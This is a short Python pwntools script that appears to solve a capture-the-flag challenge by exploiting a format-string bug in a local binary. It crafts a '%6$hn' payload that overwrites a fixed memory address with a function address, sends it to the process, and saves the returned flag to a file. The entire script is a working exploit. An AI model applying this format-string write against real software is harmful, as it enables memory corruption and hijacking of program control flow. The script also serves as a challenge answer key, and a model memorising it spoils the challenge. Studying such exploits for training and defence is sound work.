#!/usr/bin/env python
from __future__ import print_function

import pwn

pwn.context.terminal = "tmux splitw -h".split()
pwn.context.arch="amd64"

exe = pwn.context.binary = pwn.ELF('main.elf')
# libc = pwn.ELF("/lib/x86_64-linux-gnu/libc.so.6")

magic = 0x2a202008
callofbugs = 0x2a2002c0

r = pwn.process("./main.elf".split())
#r = pwn.gdb.debug("./main.elf", gdbscript="b* readIn+65\nc")

#payload = pwn.fmtstr.fmtstr_payload(6, { magic: callofbugs }, numbwritten=0, write_size='short')
payload = pwn.p32(magic) + "%%%dc" % 0x02c0 + "%6$hn"
pwn.log.info("PAYLOAD: %s (%d)" % (payload, len(payload)))
payload_str = payload.encode("hex")
pwn.log.info("PAYLOAD (Hex): %s" % ("\\x" + "\\x".join(payload_str[i:i+2] for i in range(0, len(payload_str), 2))))

r.sendline(payload)

r.recvuntil("Too")
r.recvline()

flag = r.recv(timeout=60)
print(flag)
r.close()

f = open("./solution.txt", "w")
f.write(flag)
f.close()

